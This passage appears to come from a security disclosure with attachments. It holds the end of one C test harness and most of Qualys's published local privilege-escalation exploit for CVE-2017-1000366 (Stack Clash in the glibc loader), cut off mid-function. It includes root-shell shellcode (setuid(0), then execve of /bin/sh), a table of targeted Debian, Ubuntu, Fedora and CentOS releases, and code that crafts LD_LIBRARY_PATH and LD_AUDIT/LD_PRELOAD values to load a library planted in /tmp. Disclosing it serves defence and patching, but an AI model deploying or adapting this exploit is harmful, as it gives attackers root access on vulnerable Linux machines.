            execve(*argv, argv, envp);
            die();
        }
        int status = 0;
        struct timeval start, stop, diff;
        if (gettimeofday(&start, NULL)) die();
        if (waitpid(pid, &status, WUNTRACED) != pid) die();
        if (gettimeofday(&stop, NULL)) die();
        timersub(&stop, &start, &diff);
        printf("try %zu %ld.%06ld ", try, diff.tv_sec, diff.tv_usec);

        if (WIFSIGNALED(status)) {
            printf("signal %d\n", WTERMSIG(status));
            switch (WTERMSIG(status)) {
                case SIGPIPE:
                case SIGSEGV:
                case SIGBUS:
                    break;
                default:
                    die();
            }
        } else if (WIFEXITED(status)) {
            printf("exited %d\n", WEXITSTATUS(status));
        } else if (WIFSTOPPED(status)) {
            printf("stopped %d\n", WSTOPSIG(status));
            die();
        } else {
            printf("unknown %d\n", status);
            die();
        }
    }
    die();
}

--WIyZ46R2i8wDzkSu
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="Linux_ldso_hwcap_64.c"

/*
 * Linux_ldso_hwcap_64.c for CVE-2017-1000366, CVE-2017-1000379
 * Copyright (C) 2017 Qualys, Inc.
 *
 * my_important_hwcaps() adapted from elf/dl-hwcaps.c,
 * part of the GNU C Library:
 * Copyright (C) 2012-2017 Free Software Foundation, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

/**
cat > la.c << "EOF"
static void __attribute__ ((constructor)) _init (void) {
    __asm__ __volatile__ (
    "addq $64, %rsp;"
    // setuid(0);
    "movq $105, %rax;"
    "movq $0, %rdi;"
    "syscall;"
    // setgid(0);
    "movq $106, %rax;"
    "movq $0, %rdi;"
    "syscall;"
    // dup2(0, 1);
    "movq $33, %rax;"
    "movq $0, %rdi;"
    "movq $1, %rsi;"
    "syscall;"
    // dup2(0, 2);
    "movq $33, %rax;"
    "movq $0, %rdi;"
    "movq $2, %rsi;"
    "syscall;"
    // execve("/bin/sh");
    "movq $59, %rax;"
    "movq $0x0068732f6e69622f, %rdi;"
    "pushq %rdi;"
    "movq %rsp, %rdi;"
    "movq $0, %rdx;"
    "pushq %rdx;"
    "pushq %rdi;"
    "movq %rsp, %rsi;"
    "syscall;"
    // exit(0);
    "movq $60, %rax;"
    "movq $0, %rdi;"
    "syscall;"
    );
}
EOF
gcc -fpic -shared -nostdlib -Os -s -o la.so la.c
xxd -i la.so > la.so.h
**/

#define _GNU_SOURCE
#include <assert.h>
#include <elf.h>
#include <fcntl.h>
#include <limits.h>
#include <link.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define PAGESZ ((size_t)4096)
#define STACK_ALIGN ((size_t)16)
#define MALLOC_ALIGN ((size_t)8)

#define MAX_ARG_STRLEN ((size_t)128<<10)

#define SUB_STACK_RAND ((size_t)8192)
#define INITIAL_STACK_EXPANSION (131072UL)

#define LDSO "/lib64/ld-linux-x86-64.so.2"

static const struct target * target;
static const struct target {
    const char * name;
    size_t vdso_vvar;
    int jump_ldso_pie;
    int CVE_2015_1593;
    int offset2lib;
    const char * system_dir;
    const char * repl_lib;
    unsigned int extra_page;
    int ignore_lib;
    int ignore_origin;
    int disable_audit;
} targets[] = {
    {
        .name = "Debian 7.7 (wheezy)",
        .vdso_vvar = 4096,
        .jump_ldso_pie = 1,
        .CVE_2015_1593 = 1,
        .offset2lib = 1,
        .system_dir = "/lib",
        .repl_lib = "lib/x86_64-linux-gnu",
    },
    {
        .name = "Debian 8.5 (jessie)",
        .vdso_vvar = 16384,
        .offset2lib = 1,
        .system_dir = "/lib",
        .repl_lib = "lib/x86_64-linux-gnu",
    },
    {
        .name = "Debian 9.0 (stretch)",
        .vdso_vvar = 16384,
        .system_dir = "/lib",
        .repl_lib = "lib/x86_64-linux-gnu",
        .extra_page = 1,
    },
    {
        .name = "Ubuntu 14.04.2 (Trusty Tahr)",
        .vdso_vvar = 8192,
        .jump_ldso_pie = 1,
        .CVE_2015_1593 = 1,
        .offset2lib = 1,
        .system_dir = "/lib",
        .repl_lib = "lib/x86_64-linux-gnu",
        .disable_audit = 1,
    },
    {
        .name = "Ubuntu 16.04.2 (Xenial Xerus)",
        .vdso_vvar = 16384,
        .system_dir = "/lib",
        .repl_lib = "lib/x86_64-linux-gnu",
        .disable_audit = 1,
    },
    {
        .name = "Ubuntu 17.04 (Zesty Zapus)",
        .vdso_vvar = 16384,
        .system_dir = "/lib",
        .repl_lib = "lib/x86_64-linux-gnu",
        .extra_page = 1,
        .disable_audit = 1,
    },
    {
        .name = "Fedora 22 (Twenty Two)",
        .vdso_vvar = 16384,
        .offset2lib = 1,
        .system_dir = "/lib64",
        .repl_lib = "lib64",
    },
    {
        .name = "Fedora 25 (Server Edition)",
        .vdso_vvar = 16384,
        .system_dir = "/lib64",
        .repl_lib = "lib64",
        .extra_page = 1,
    },
    {
        .name = "CentOS 7.3.1611 (Core)",
        .vdso_vvar = 8192,
        .jump_ldso_pie = 1,
        .offset2lib = 1,
        .system_dir = "/lib64",
        .repl_lib = "lib64",
    },
};

#define die() do { \
    printf("died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static const char *
my_asprintf(const char * const fmt, ...)
{
    if (!fmt) die();
    char * str = NULL;
    va_list ap;
    va_start(ap, fmt);
    const int len = vasprintf(&str, fmt, ap);
    va_end(ap);
    if (!str) die();
    if (len <= 0) die();
    if ((unsigned int)len != strlen(str)) die();
    return str;
}

static const ElfW(auxv_t) * my_auxv;

static unsigned long int
my_getauxval (const unsigned long int type)
{
    const ElfW(auxv_t) * p;

    if (!my_auxv) die();
    for (p = my_auxv; p->a_type != AT_NULL; p++)
        if (p->a_type == type)
            return p->a_un.a_val;
    die();
}

struct elf_info {
    ElfW(Half) type;
    uintptr_t rx_start, rx_end;
    uintptr_t rw_start, rw_end;
};

static struct elf_info
get_elf_info(const char * const binary)
{
    struct elf_info elf = { ET_NONE };
    if (elf.rx_start || elf.rx_end) die();
    if (elf.rw_start || elf.rw_end) die();

    const int fd = open(binary, O_RDONLY);
    if (fd <= -1) die();
    struct stat st;
    if (fstat(fd, &st)) die();
    if (!S_ISREG(st.st_mode)) die();
    if (st.st_size <= 0) die();
    #define SAFESZ ((size_t)64<<20)
    if (st.st_size >= (ssize_t)SAFESZ) die();
    const size_t size = st.st_size;
    uint8_t * const buf = malloc(size);
    if (!buf) die();
    if (read(fd, buf, size) != (ssize_t)size) die();
    if (close(fd)) die();

    if (size <= sizeof(ElfW(Ehdr))) die();
    const ElfW(Ehdr) * const ehdr = (const ElfW(Ehdr) *)buf;
    if (ehdr->e_ident[EI_MAG0] != ELFMAG0) die();
    if (ehdr->e_ident[EI_MAG1] != ELFMAG1) die();
    if (ehdr->e_ident[EI_MAG2] != ELFMAG2) die();
    if (ehdr->e_ident[EI_MAG3] != ELFMAG3) die();
    if (ehdr->e_ident[EI_CLASS] != ELFCLASS64) die();
    if (ehdr->e_ident[EI_DATA] != ELFDATA2LSB) die();
    if (ehdr->e_type != ET_DYN && ehdr->e_type != ET_EXEC) die();
    if (ehdr->e_machine != EM_X86_64) die();
    if (ehdr->e_version != EV_CURRENT) die();
    if (ehdr->e_ehsize != sizeof(ElfW(Ehdr))) die();
    if (ehdr->e_phentsize != sizeof(ElfW(Phdr))) die();
    if (ehdr->e_phoff <= 0 || ehdr->e_phoff >= size) die();
    if (ehdr->e_phnum > (size - ehdr->e_phoff) / sizeof(ElfW(Phdr))) die();
    elf.type = ehdr->e_type;

    int interp = 0;
    unsigned int i;
    for (i = 0; i < ehdr->e_phnum; i++) {
        const ElfW(Phdr) * const phdr = (const ElfW(Phdr) *)(buf + ehdr->e_phoff) + i;
        if (phdr->p_type == PT_INTERP) interp = 1;
        if (phdr->p_type != PT_LOAD) continue;

        if (phdr->p_offset >= size) die();
        if (phdr->p_filesz > size - phdr->p_offset) die();
        if (phdr->p_filesz > phdr->p_memsz) die();
        if (phdr->p_vaddr != phdr->p_paddr) die();
        if (phdr->p_vaddr >= SAFESZ) die();
        if (phdr->p_memsz >= SAFESZ) die();
        if (phdr->p_memsz <= 0) die();
        if (phdr->p_align != 0x200000) die();

        switch (phdr->p_flags) {
            case PF_R | PF_X:
                if (elf.rx_end) die();
                if (elf.rw_end) die();
                if (phdr->p_vaddr && ehdr->e_type != ET_EXEC) die();
                elf.rx_start = phdr->p_vaddr & ~(PAGESZ-1);
                elf.rx_end = (phdr->p_vaddr + phdr->p_memsz + PAGESZ-1) & ~(PAGESZ-1);
                if (!elf.rx_end) die();
                break;
            case PF_R | PF_W:
                if (!elf.rx_end) die();
                if (elf.rw_end) die();
                elf.rw_start = phdr->p_vaddr & ~(PAGESZ-1);
                elf.rw_end = (phdr->p_vaddr + phdr->p_memsz + PAGESZ-1) & ~(PAGESZ-1);
                if (elf.rw_start <= elf.rx_end) die();
                break;
            default:
                die();
        }
    }
    if (!interp && !strstr(binary, "/ld-linux")) die();
    if (!elf.rx_end) die();
    if (!elf.rw_end) die();
    free(buf);
    return elf;
}

/* There are no hardware capabilities defined.  */
#define my_hwcap_string(idx) ""

struct my_important_hwcaps {
    unsigned long hwcap_mask;
    size_t max_capstrlen;
    size_t pointers;
    size_t strings;
};

struct my_link_map {
    const ElfW(Phdr) * l_phdr;
    ElfW(Half) l_phnum;
    ElfW(Addr) l_addr;
};

struct r_strlenpair
  {
    const char *str;
    size_t len;
  };

/* Return an array of useful/necessary hardware capability names.  */
static struct my_important_hwcaps
my_important_hwcaps (const char * const platform, const size_t platform_len,
                     const uint64_t hwcap, const uint64_t hwcap_mask,
                     const struct my_link_map * sysinfo_map)
{
  static const struct my_important_hwcaps err;
  /* Determine how many important bits are set.  */
  uint64_t masked = hwcap & hwcap_mask;
  size_t cnt = platform != NULL;
  size_t n, m;
  size_t total;
  struct r_strlenpair *result;

  /* Count the number of bits set in the masked value.  */
  for (n = 0; (~((1ULL << n) - 1) & masked) != 0; ++n)
    if ((masked & (1ULL << n)) != 0)
      ++cnt;

  /* The system-supplied DSO can contain a note of type 2, vendor "GNU".
     This gives us a list of names to treat as fake hwcap bits.  */

  const char *dsocaps = NULL;
  size_t dsocapslen = 0;
  if (sysinfo_map != NULL)
    {
      const ElfW(Phdr) *const phdr = sysinfo_map->l_phdr;
      const ElfW(Word) phnum = sysinfo_map->l_phnum;
      uint_fast16_t i;
      for (i = 0; i < phnum; ++i)
        if (phdr[i].p_type == PT_NOTE)
          {
            const ElfW(Addr) start = (phdr[i].p_vaddr
                                      + sysinfo_map->l_addr);
            /* The standard ELF note layout is exactly as the anonymous struct.
               The next element is a variable length vendor name of length
               VENDORLEN (with a real length rounded to ElfW(Word)), followed
               by the data of length DATALEN (with a real length rounded to
               ElfW(Word)).  */
            const struct
            {
              ElfW(Word) vendorlen;
              ElfW(Word) datalen;
              ElfW(Word) type;
            } *note = (const void *) start;
            while ((ElfW(Addr)) (note + 1) - start < phdr[i].p_memsz)
              {
#define ROUND(len) (((len) + sizeof (ElfW(Word)) - 1) & -sizeof (ElfW(Word)))
                /* The layout of the type 2, vendor "GNU" note is as follows:
                   .long <Number of capabilities enabled by this note>
                   .long <Capabilities mask> (as mask >> _DL_FIRST_EXTRA).
                   .byte <The bit number for the next capability>
                   .asciz <The name of the capability>.  */
                if (note->type == NT_GNU_HWCAP
                    && note->vendorlen == sizeof "GNU"
                    && !memcmp ((note + 1), "GNU", sizeof "GNU")
                    && note->datalen > 2 * sizeof (ElfW(Word)) + 2)
                  {
                    const ElfW(Word) *p = ((const void *) (note + 1)
                                           + ROUND (sizeof "GNU"));
                    cnt += *p++;
                    ++p;        /* Skip mask word.  */
                    dsocaps = (const char *) p; /* Pseudo-string "<b>name"  */
                    dsocapslen = note->datalen - sizeof *p * 2;
                    break;
                  }
                note = ((const void *) (note + 1)
                        + ROUND (note->vendorlen) + ROUND (note->datalen));
#undef ROUND
              }
            if (dsocaps != NULL)
              break;
          }
    }

  /* For TLS enabled builds always add 'tls'.  */
  ++cnt;

  /* Create temporary data structure to generate result table.  */
  if (cnt < 2) return err;
  if (cnt >= 32) return err;
  struct r_strlenpair temp[cnt];
  m = 0;
  if (dsocaps != NULL)
    {
      /* dsocaps points to the .asciz string, and -1 points to the mask
         .long just before the string.  */
      const ElfW(Word) mask = ((const ElfW(Word) *) dsocaps)[-1];
      size_t len;
      const char *p;
      for (p = dsocaps; p < dsocaps + dsocapslen; p += len + 1)
        {
          uint_fast8_t bit = *p++;
          len = strlen (p);

          /* Skip entries that are not enabled in the mask word.  */
          if (mask & ((ElfW(Word)) 1 << bit))
            {
              temp[m].str = p;
              temp[m].len = len;
              ++m;
            }
          else
            --cnt;
        }
    }
  for (n = 0; masked != 0; ++n)
    if ((masked & (1ULL << n)) != 0)
      {
        temp[m].str = my_hwcap_string (n);
        temp[m].len = strlen (temp[m].str);
        masked ^= 1ULL << n;
        ++m;
      }
  if (platform != NULL)
    {
      temp[m].str = platform;
      temp[m].len = platform_len;
      ++m;
    }

  temp[m].str = "tls";
  temp[m].len = 3;
  ++m;

  assert (m == cnt);

  /* Determine the total size of all strings together.  */
  if (cnt == 1)
    total = temp[0].len + 1;
  else
    {
      total = temp[0].len + temp[cnt - 1].len + 2;
      if (cnt > 2)
        {
          total <<= 1;
          for (n = 1; n + 1 < cnt; ++n)
            total += temp[n].len + 1;
          if (cnt > 3
              && (cnt >= sizeof (size_t) * 8
                  || total + (sizeof (*result) << 3)
                     >= (1UL << (sizeof (size_t) * 8 - cnt + 3))))
            return err;

          total <<= cnt - 3;
        }
    }

  /* The result structure: we use a very compressed way to store the
     various combinations of capability names.  */
  const size_t _sz = 1 << cnt;

  /* Now we are ready to install the string pointers and length.  */
  size_t max_capstrlen = 0;
  n = cnt;
  do
    {
      const size_t mask = 1 << --n;
      for (m = 1 << cnt; m > 0; ) {
        if ((--m & mask) != 0)
          max_capstrlen += temp[n].len + 1;
        break;
      }
    }
  while (n != 0);

  if (hwcap_mask > ULONG_MAX) die();
  const struct my_important_hwcaps ret = {
      .hwcap_mask = hwcap_mask,
      .max_capstrlen = max_capstrlen,
      .pointers = _sz * sizeof (*result),
      .strings = total,
  };
  return ret;
}

static size_t
my_bsearch(const void * const key,
    const void * const base, const size_t nmemb, const size_t size,
    int (* const compar)(const void *, const void *))
{
    if (!key) die();
    if (!size) die();
    if (!compar) die();
    if (nmemb >= SSIZE_MAX / size) die();
    if (!base != !nmemb) die();
    if (!base || !nmemb) return 0;

    size_t low = 0;
    size_t high = nmemb - 1;
    while (low <= high) {
        const size_t mid = low + (high - low) / 2;
        if (mid >= nmemb) die();
        const int cond = compar(key, base + mid * size);
        switch (cond) {
        case 0:
            return mid;
        case -1:
            if (mid <= 0) {
                if (mid != 0) die();
                if (low != 0) die();
                return low;
            }
            high = mid - 1;
            break;
        case +1:
            low = mid + 1;
            break;
        default:
            die();
        }
    }
    if (low > nmemb) die();
    return low;
}

static int
cmp_important_hwcaps(const void * const _a, const void * const _b)
{
    const struct my_important_hwcaps * const a = _a;
    const struct my_important_hwcaps * const b = _b;

    if (a->strings < b->strings) return -1;
    if (a->strings > b->strings) return +1;

    if (a->pointers < b->pointers) return -1;
    if (a->pointers > b->pointers) return +1;

    if (a->max_capstrlen < b->max_capstrlen) return -1;
    if (a->max_capstrlen > b->max_capstrlen) return +1;

    return 0;
}

static void
copy_lib(const char * const src, const char * const dst)
{
    if (!src) die();
    if (*src != '/') die();

    if (!dst) die();
    if (*dst != '/') die();

    const int src_fd = open(src, O_RDONLY);
    if (src_fd <= -1) die();

    const int dst_fd = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW, 0);
    if (dst_fd <= -1) die();

    for (;;) {
        char buf[1024];
        const ssize_t rd = read(src_fd, buf, sizeof(buf));
        if (rd == 0) break;
        if (rd <= 0) die();
        const ssize_t wr = write(dst_fd, buf, rd);
        if (wr != rd) die();
    }

    if (fchmod(dst_fd, 0755)) die();
    if (close(dst_fd)) die();
    if (close(src_fd)) die();
}

static void
create_needed_libs(const char * const bin, const char * const dir)
{
    if (!bin) die();
    if (*bin != '/') die();
    if (strspn(bin, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+,-./_") != strlen(bin)) die();

    if (!dir) die();
    if (*dir != '/') die();
    if (dir[strlen(dir)-1] != '/') die();

    char cmd[256];
    if ((unsigned int)snprintf(cmd, sizeof(cmd), "/usr/bin/env - %s --list %s", LDSO, bin)
                                 >= sizeof(cmd)) die();
    FILE * const fp = popen(cmd, "r");
    if (!fp) die();

    char buf[256];
    unsigned int num_libs = 0;
    while (fgets(buf, sizeof(buf), fp) == buf) {
        if (!strchr(buf, '\n')) die();

        const char * const rel_lib = buf + strspn(buf, "\t ");
        if (strncmp(rel_lib, "lib", 3)) continue;

        char * sp = strchr(rel_lib, ' ');
        if (!sp) die();
        if (strncmp(sp, " => /", 5)) die();
        *sp = '\0';
        if (strchr(rel_lib, '/')) die();

        const char * const abs_lib = sp + 4;
        if (*abs_lib != '/') die();
        sp = strchr(abs_lib, ' ');
        if (!sp) die();
        if (strncmp(sp, " (0x", 4)) die();
        *sp = '\0';

        size_t i;
        static const char * const prefixes[] = { "", "/", "/.", "/.." };
        for (i = 0; i < sizeof(prefixes)/sizeof(*prefixes); i++) {

            char tmp_lib[256];
            if ((unsigned int)snprintf(tmp_lib, sizeof(tmp_lib), "%s%s%s", dir, prefixes[i], rel_lib)
                                             >= sizeof(tmp_lib)) die();
            copy_lib(abs_lib, tmp_lib);
        }
        if (!++num_libs) die();
    }
    if (!num_libs) die();
    printf("copied %u lib%s\n", num_libs, num_libs > 1 ? "s" : "");
    if (pclose(fp) != EXIT_SUCCESS) die();
}

int
main(const int my_argc, const char * const my_argv[], const char * const my_envp[])
{
  {
    const char * const * p = my_envp;
    while (*p++) ;
    my_auxv = (const void *)p;
  }
    if (my_getauxval(AT_PAGESZ) != PAGESZ) die();

    if (my_argc != 1+2) {
        printf("Usage: %s target binary\n", my_argv[0]);
        size_t i;
        for (i = 0; i < sizeof(targets)/sizeof(*targets); i++) {
            printf("Target %zu %s\n", i, targets[i].name);
        }
        die();
    }
  {
    const size_t i = strtoul(my_argv[1], NULL, 10);
    if (i >= sizeof(targets)/sizeof(*targets)) die();
    target = targets + i;
    printf("Target %zu %s\n", i, target->name);
  }
    const size_t safe_stack_size = target->CVE_2015_1593 ? 65536 : 32768;
    printf("safe_stack_size %zu\n", safe_stack_size);
    if (safe_stack_size <= SUB_STACK_RAND) die();

    const char * const binary = realpath(my_argv[2], NULL);
    if (!binary) die();
    if (*binary != '/') die();
    if (access(binary, R_OK | X_OK)) die();
    const struct elf_info elf_binary = get_elf_info(binary);
    const struct elf_info elf_interp = get_elf_info(LDSO);
    const struct elf_info elf = (elf_binary.type == ET_DYN && target->offset2lib && !target->jump_ldso_pie) ? elf_binary : elf_interp;
    const size_t jump_ldso_pie = (elf_binary.type == ET_DYN && target->offset2lib && target->jump_ldso_pie) ? (elf_binary.rx_end - elf_binary.rx_start) : 0;
    if (elf.rw_start - elf.rx_end <= target->vdso_vvar) die();

    const char * const slash = strrchr(binary, '/');
    if (!slash) die();
    if (slash <= binary) die();
    const char * const origin = strndup(binary, slash - binary);
    if (!origin) die();
    printf("origin %s (%zu)\n", origin, strlen(origin));

    const char * const platform = (const void *)my_getauxval(AT_PLATFORM);
    if (!platform) die();
    if (strcmp(platform, "x86_64") != 0) die();
    const size_t platform_len = strlen(platform);

    const struct {
        const char * str;
        size_t len;
        size_t repl_len;
    } DSTs[] = {
        #define DST_LIB "LIB"
        { DST_LIB, strlen(DST_LIB), strlen(target->repl_lib) },
        #define DST_PLATFORM "PLATFORM"
        { DST_PLATFORM, strlen(DST_PLATFORM), platform_len }
    };
    size_t repl_max = target->ignore_origin ? 0 : strlen(origin);
  {
    size_t i;
    for (i = target->ignore_lib ? 1 : 0; i < sizeof(DSTs)/sizeof(*DSTs); i++) {
        if (repl_max < DSTs[i].repl_len)
            repl_max = DSTs[i].repl_len;
    }
  }
    printf("repl_max %zu\n", repl_max);
    if (repl_max < 4) die();

    const ElfW(Ehdr) * const sysinfo_dso = (const void *)my_getauxval(AT_SYSINFO_EHDR);
    if (!sysinfo_dso) die();
    struct my_link_map sysinfo_map = {
        .l_phdr = (const void *)sysinfo_dso + sysinfo_dso->e_phoff,
        .l_phnum = sysinfo_dso->e_phnum,
        .l_addr = ULONG_MAX
    };
  {
    uint_fast16_t i;
    for (i = 0; i < sysinfo_map.l_phnum; ++i) {
        const ElfW(Phdr) * const ph = &sysinfo_map.l_phdr[i];
        if (ph->p_type == PT_LOAD) {
            if (sysinfo_map.l_addr == ULONG_MAX)
                sysinfo_map.l_addr = ph->p_vaddr;
        }
    }
  }
    if (sysinfo_map.l_addr == ULONG_MAX) die();
    sysinfo_map.l_addr = (ElfW(Addr))sysinfo_dso - sysinfo_map.l_addr;

    const unsigned long hwcap = my_getauxval(AT_HWCAP);
    if (!hwcap) die();
    struct my_important_hwcaps * important_hwcaps = NULL;
    size_t num_important_hwcaps = 0;
  {
    size_t max_important_hwcaps = 0;
    uint32_t hwcap_mask = 1;
    do {
        if (hwcap_mask & ~hwcap) continue;
        const uint64_t popcount = __builtin_popcount(hwcap_mask);
        if (popcount < 1) die();
        if (popcount > 32) die();

        const struct my_important_hwcaps ihc = my_important_hwcaps(platform, platform_len, hwcap, hwcap_mask, &sysinfo_map);
        if (!ihc.pointers) die();

        const size_t idx = my_bsearch(&ihc, important_hwcaps, num_important_hwcaps, sizeof(struct my_important_hwcaps), cmp_important_hwcaps);
        if (idx > num_important_hwcaps) die();

        if (idx == num_important_hwcaps || cmp_important_hwcaps(&ihc, important_hwcaps + idx)) {
            if (num_important_hwcaps >= max_important_hwcaps) {
                if (num_important_hwcaps != max_important_hwcaps) die();
                if (max_important_hwcaps >= 65536) die();
                max_important_hwcaps += 256;

                if (num_important_hwcaps >= max_important_hwcaps) die();
                important_hwcaps = realloc(important_hwcaps, max_important_hwcaps * sizeof(struct my_important_hwcaps));
                if (!important_hwcaps) die();
            }
            memmove(important_hwcaps + idx + 1, important_hwcaps + idx, (num_important_hwcaps - idx) * sizeof(struct my_important_hwcaps));
            important_hwcaps[idx] = ihc;
            num_important_hwcaps++;
        }
        if (!(hwcap_mask % 0x10000000))
            printf("num_important_hwcaps %zu hwcap_mask %x\n", num_important_hwcaps, hwcap_mask);
    } while (++hwcap_mask);
  }
    printf("num_important_hwcaps %zu\n", num_important_hwcaps);

    static struct {
        size_t len, gwr, dst, cnt;
        struct my_important_hwcaps ihc;
    } best = { .ihc = { .pointers = SIZE_MAX } };

    if (strrchr(target->system_dir, '/') != target->system_dir) die();
    const char * const sep_lib = my_asprintf(":%s", target->system_dir);
    const size_t sep_lib_len = strlen(sep_lib);
    if (sep_lib_len >= MALLOC_ALIGN) die();

    #define LLP "LD_LIBRARY_PATH="
    static char llp[MAX_ARG_STRLEN];

    size_t len;
    for (len = sizeof(llp) - sizeof(LLP); len >= MALLOC_ALIGN; len -= MALLOC_ALIGN) {

        size_t gwr;
        for (gwr = MALLOC_ALIGN; gwr <= len - sep_lib_len; gwr += MALLOC_ALIGN) {

            size_t dst;
            for (dst = 0; dst < sizeof(DSTs)/sizeof(*DSTs); dst++) {

                const size_t cnt = (len - sep_lib_len - gwr) / (1 + DSTs[dst].len + 1);
                const size_t gpj = (len + cnt * (repl_max - (target->ignore_lib ? 7 : 4)) + 1 + STACK_ALIGN-1) & ~(STACK_ALIGN-1);
                const size_t bwr = (cnt * (DSTs[dst].repl_len + 1)) + (len - gwr - cnt * (1 + DSTs[dst].len + 1)) + 1;

                size_t idx;
                for (idx = 0; idx < num_important_hwcaps; idx++) {
                    const struct my_important_hwcaps ihc = important_hwcaps[idx];
                    if (ihc.max_capstrlen % MALLOC_ALIGN >= sizeof("/..")) continue;
                    if (ihc.pointers <= 2 * SUB_STACK_RAND) continue;

                    const size_t nup = ((ihc.pointers + ihc.strings + PAGESZ-1) & ~(PAGESZ-1)) + (target->extra_page * PAGESZ);
                    if (nup >= (elf.rw_start - elf.rx_end) - target->vdso_vvar) continue;

                    const size_t ihc_strings_start = ihc.pointers;
                    const size_t ihc_strings_end = ihc_strings_start + ihc.strings;

                    const size_t gpj_base = nup + target->vdso_vvar + (elf.rw_end - elf.rw_start) + jump_ldso_pie + PAGESZ + safe_stack_size;
                    const size_t gpj_base_lo = gpj_base - SUB_STACK_RAND;
                    const size_t gpj_base_hi = gpj_base + SUB_STACK_RAND;

                    if (gpj_base_lo <= gpj) continue;
                    if (gpj_base_hi - gpj >= ihc_strings_start) continue;
                    if (gpj_base_lo - gpj + gwr <= ihc_strings_start) continue;
                    if (gpj_base_hi - gpj + gwr + bwr >= ihc_strings_end) continue;

                    if (best.ihc.pointers <= ihc.pointers) continue;
                    best.ihc = ihc;
                    best.len = len;
                    best.gwr = gwr;
                    best.dst = dst;
                    best.cnt = cnt;
                    printf("max %zu ihcp %zu ihcs %zu len %zu gpj %zu gwr %zu bwr %zu cnt %zu dst %zu repl %zu\n",
                        ihc.max_capstrlen, ihc.pointers, ihc.strings, len, gpj, gwr, bwr, cnt, DSTs[dst].len, DSTs[dst].repl_len);
                }
            }
        }
    }
    if (best.ihc.pointers >= SIZE_MAX) die();

    if (INITIAL_STACK_EXPANSION <= safe_stack_size) die();
    const size_t pads = (INITIAL_STACK_EXPANSION - safe_stack_size) / sizeof(char *);
    static char pad[MAX_ARG_STRLEN];
    memset(pad, ' ', sizeof(pad)-1);

  {
    char * cp = mempcpy(llp, LLP, sizeof(LLP)-1);
    memset(cp, '/', best.len);
    if (best.len <= sep_lib_len) die();
    memcpy(cp + best.len - sep_lib_len, sep_lib, sep_lib_len);
    if (*(cp + best.len)) die();

    #define LIB_TO_TMP "/../tmp/"
    if (sizeof(LIB_TO_TMP)-1 != MALLOC_ALIGN) die();

    if (!best.gwr) die();
    if (best.gwr >= best.len) die();
    if (best.gwr % MALLOC_ALIGN) die();
    size_t i;
    for (i = 0; i < best.gwr / MALLOC_ALIGN; i++) {
        cp = mempcpy(cp, LIB_TO_TMP, MALLOC_ALIGN);
    }
    if (!best.cnt) die();
    if (best.dst >= sizeof(DSTs)/sizeof(*DSTs)) die();
    for (i = 0; i < best.cnt; i++) {
        *cp++ = '$';
        cp = mempcpy(cp, DSTs[best.dst].str, DSTs[best.dst].len);
        *cp++ = '/';
    }
    if (cp >= llp + sizeof(llp)) die();
    if (llp[sizeof(llp)-1]) die();
    if (strlen(llp) != sizeof(LLP)-1 + best.len) die();
  }

    #define LHCM "LD_HWCAP_MASK="
    static char lhcm[64];
    if ((unsigned int)snprintf(lhcm, sizeof(lhcm), "%s%lu", LHCM, best.ihc.hwcap_mask)
                                  >= sizeof(lhcm)) die();

    const size_t args = 1 + (target->jump_ldso_pie ? 0 : pads) + 1;
    char ** const argv = calloc(args, sizeof(char *));
    if (!argv) die();
  {
    char ** ap = argv;
    *ap++ = (char *)binary;
    if (!target->jump_ldso_pie) {
        size_t i;
        for (i = 0; i < pads; i++) {
            *ap++ = pad;
        }
    }
    *ap++ = NULL;
    if (ap != argv + args) die();
  }

    const size_t envs = 3 + (target->jump_ldso_pie ? pads : 0) + 1;
    char ** const envp = calloc(envs, sizeof(char *));
    if (!envp) die();
  {
    char ** ep = envp;
    *ep++ = llp;
    *ep++ = lhcm;
    #define REL_LA "a"
    #define LDA "LD_AUDIT="
    #define LDP "LD_PRELOAD="
    *ep++ = target->disable_audit ? LDP REL_LA : LDA REL_LA;
    if (target->jump_ldso_pie) {
        size_t i;
        for (i = 0; i < pads; i++) {
            *ep++ = pad;
        }
    }
    *ep++ = NULL;
    if (ep != envp + envs) die();
  }

  {
    const size_t MIN_GAP = target->CVE_2015_1593 ?
        (128*1024*1024UL + (((-1U ) & 0x3fffff) << 12)) :
        (128*1024*1024UL + (((-1UL) & 0x3fffff) << 12)) ;
    printf("MIN_GAP %zu\n", MIN_GAP);

    if (pads * sizeof(pad) + (1<<20) >= MIN_GAP / 4) die();
    const struct rlimit rlimit_stack = { MIN_GAP, MIN_GAP };
    if (setrlimit(RLIMIT_STACK, &rlimit_stack)) die();
  }

    int pipefd[2];
    if (pipe(pipefd)) die();
    if (close(pipefd[0])) die();
    pipefd[0] = -1;
    if (signal(SIGPIPE, SIG_DFL) == SIG_ERR) die();

  {
    const char * const abs_la_dir = my_asprintf("/%s/%s/", target->system_dir, LIB_TO_TMP);
    const char * const abs_las[] = {
        my_asprintf("%s%s%s", abs_la_dir, "", REL_LA),
        my_asprintf("%s%s%s", abs_la_dir, "/", REL_LA),
        my_asprintf("%s%s%s", abs_la_dir, "/.", REL_LA),
        my_asprintf("%s%s%s", abs_la_dir, "/..", REL_LA),
    };
    size_t i;
    for (i = 0; i < sizeof(abs_las)/sizeof(*abs_las); i++) {
        const int fd = open(abs_las[i], O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW, 0);
        if (fd <= -1) die();
      {
        struct stat st;
        if (fstat(fd, &st)) die();
        if (!S_ISREG(st.st_mode)) die();
        if (st.st_uid != getuid()) die();
        if (st.st_uid != geteuid()) die();
      }
      {
        static const
        #include "la.so.h"
        if (sizeof(la_so) != la_so_len) die();
